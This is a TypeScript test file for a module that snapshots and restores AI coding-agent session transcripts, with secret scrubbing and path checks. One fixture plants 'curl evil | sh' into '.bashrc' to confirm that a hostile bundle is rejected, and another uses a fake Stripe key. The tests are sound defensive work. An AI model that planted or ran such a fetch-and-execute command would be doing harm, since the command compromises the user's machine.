import { describe, expect, it, vi } from "vitest";
import { createSecretScrubber } from "../../../secrets/secret-scrubber";
import {
  MAX_SNAPSHOT_RAW_BYTES,
  SnapshotTooLargeError,
  collectSessionFiles,
  decodeSnapshot,
  encodeSnapshot,
  writeSessionFiles,
  type SnapshotFileSession,
} from "../snapshot-bundle";
import { sessionFileSpec, type SessionFileSpec } from "../session-files";

const HOME = "/home/user";
const SPEC = sessionFileSpec({
  harnessId: "claude-code",
  harnessSessionId: "hs-1",
  resumeState: { data: { claudeSessionId: "abc" } },
  home: HOME,
}) as SessionFileSpec;
const TRANSCRIPT = ".claude/projects/-home-user-w/abc.jsonl";

function fakeBox(files: Record<string, string>, listing?: string) {
  const writes: Array<{ path: string; content: string }> = [];
  const commands: string[] = [];
  const session: SnapshotFileSession = {
    readTextFile: async ({ path }) =>
      files[path.slice(HOME.length + 1)] ?? null,
    writeTextFile: async (args) => {
      writes.push(args);
    },
    run: async ({ command }) => {
      commands.push(command);
      const stdout =
        listing ??
        Object.entries(files)
          .map(([path, content]) => `${content.length}\t${HOME}/${path}`)
          .join("\n");
      return { exitCode: 0, stdout, stderr: "" };
    },
  };
  return { session, writes, commands };
}

describe("collectSessionFiles", () => {
  it("reads the listed files and scrubs the turn's secrets out of them", async () => {
    const box = fakeBox({
      [TRANSCRIPT]: '{"tool":"env","out":"STRIPE_KEY=sk_live_abcdefgh123"}\n',
    });
    const files = await collectSessionFiles({
      session: box.session,
      spec: SPEC,
      home: HOME,
      scrubber: createSecretScrubber([
        { name: "STRIPE_KEY", value: "sk_live_abcdefgh123" },
      ]),
    });
    expect(files).toHaveLength(1);
    expect(files[0]!.path).toBe(TRANSCRIPT);
    expect(files[0]!.content).not.toContain("sk_live_abcdefgh123");
    expect(files[0]!.content).toContain("[secret:STRIPE_KEY]");
  });

  it("drops a transcript's unfinished last line, which the next turn may be writing", async () => {
    const box = fakeBox({ [TRANSCRIPT]: '{"a":1}\n{"b":' });
    const files = await collectSessionFiles({
      session: box.session,
      spec: SPEC,
      home: HOME,
      scrubber: null,
    });
    expect(files[0]!.content).toBe('{"a":1}\n');
  });

  it("refuses a session larger than the limit before reading anything", async () => {
    const box = fakeBox(
      {},
      `${MAX_SNAPSHOT_RAW_BYTES + 1}\t${HOME}/${TRANSCRIPT}`,
    );
    const read = vi.spyOn(box.session, "readTextFile");
    await expect(
      collectSessionFiles({
        session: box.session,
        spec: SPEC,
        home: HOME,
        scrubber: null,
      }),
    ).rejects.toBeInstanceOf(SnapshotTooLargeError);
    expect(read).not.toHaveBeenCalled();
  });
});

describe("encodeSnapshot / decodeSnapshot", () => {
  const bundle = {
    version: 1 as const,
    harnessId: "claude-code" as const,
    harnessSessionId: "hs-1",
    workDir: "/home/user/claude-code-hs-1",
    files: [{ path: TRANSCRIPT, content: "{}\n" }],
  };

  it("round-trips a bundle", () => {
    const decoded = decodeSnapshot(encodeSnapshot(bundle), {
      spec: SPEC,
      home: HOME,
      harnessSessionId: "hs-1",
    });
    expect(decoded).toEqual(bundle);
  });

  it("refuses another session's bundle", () => {
    expect(() =>
      decodeSnapshot(encodeSnapshot(bundle), {
        spec: SPEC,
        home: HOME,
        harnessSessionId: "hs-2",
      }),
    ).toThrow(/does not belong/);
  });

  it("refuses a bundle naming a file outside the session folder", () => {
    const hostile = {
      ...bundle,
      files: [{ path: ".bashrc", content: "curl evil | sh" }],
    };
    expect(() =>
      decodeSnapshot(encodeSnapshot(hostile), {
        spec: SPEC,
        home: HOME,
        harnessSessionId: "hs-1",
      }),
    ).toThrow(/outside the session folder/);
  });
});

describe("writeSessionFiles", () => {
  it("creates the folders, then writes every file under home", async () => {
    const box = fakeBox({});
    await writeSessionFiles({
      session: box.session,
      home: HOME,
      files: [{ path: TRANSCRIPT, content: "{}\n" }],
    });
    expect(box.commands).toEqual([
      "mkdir -p '/home/user/.claude/projects/-home-user-w'",
    ]);
    expect(box.writes).toEqual([
      { path: `${HOME}/${TRANSCRIPT}`, content: "{}\n" },
    ]);
  });
});
